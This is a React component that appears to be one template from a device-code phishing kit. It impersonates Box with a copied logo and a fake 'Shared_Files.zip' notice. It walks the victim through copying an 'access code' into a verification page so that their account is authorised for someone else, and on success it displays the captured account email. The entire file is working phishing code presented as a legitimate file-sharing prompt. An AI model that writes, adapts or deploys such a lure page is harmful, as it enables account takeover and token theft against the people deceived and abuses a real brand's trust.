import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function BoxTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();

  return (
    <div className="tpl-page" style={{ background: '#f4f6f9' }}>
      <div className="tpl-container" style={{ maxWidth: 480 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0061D5"/><text x="7" y="22" fill="white" fontSize="15" fontWeight="bold" fontFamily="Arial">Box</text></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#222' }}>Box</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Secure File Sharing</h1>
              <p className="tpl-text">Someone has shared a secure file with you on Box. Verify your identity to access the shared content.</p>
              <div className="tpl-info-box" style={{ background: '#e8f0fe', borderColor: '#a8c7fa', color: '#0061D5' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0061D5" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                <span>Shared_Files.zip — 3 files available for download</span>
              </div>
              <button className="tpl-btn" style={{ background: '#0061D5' }} onClick={f.handleStart}>Verify to Access Files</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing secure access...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Verify Your Account</h1>
              <p className="tpl-text">Enter this code to verify your identity and download the shared files.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">ACCESS CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the access code above</div><div className="tpl-step">2. Click the button below to verify</div></div>
              <button className="tpl-btn" style={{ background: '#0061D5' }} onClick={f.handleVerify}>Open Verification</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Verifying your identity...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Access Granted</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You can now download the shared files.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Access another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><p className="tpl-text">Please try again.</p><button className="tpl-btn" style={{ background: '#0061D5' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0061D5' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Box Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
